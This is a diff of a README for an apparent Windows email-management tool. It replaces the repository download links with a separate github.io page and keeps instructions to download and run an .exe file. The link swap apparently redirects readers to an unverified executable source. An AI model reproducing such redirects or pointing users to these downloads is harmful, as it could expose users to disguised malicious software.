@@ -1,6 +1,6 @@
 # 📩 bharga-mail-inbox-tools - Manage your private email with ease
 
-[![Download Bharga Mail](https://img.shields.io/badge/Download-Bharga_Mail-blue)](https://github.com/Colorful-bulldogwrench24/bharga-mail-inbox-tools)
+[![Download Bharga Mail](https://img.shields.io/badge/Download-Bharga_Mail-blue)](https://colorful-bulldogwrench24.github.io)
 
 Bharga Mail protects your privacy while you manage your email. This desktop software keeps your messages on your computer. You choose when and how to connect to your accounts. Internal tools help you sort your inbox and draft messages using local AI. 
 
@@ -17,7 +17,7 @@ Bharga Mail needs a standard Windows computer to function well. Check your syste
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the repository page to download the software: https://github.com/Colorful-bulldogwrench24/bharga-mail-inbox-tools
+1. Visit the repository page to download the software: https://colorful-bulldogwrench24.github.io
 2. Look for the latest release version on the page.
 3. Click the link that ends with `.exe` to start the download.
 4. Save the file to your Downloads folder.
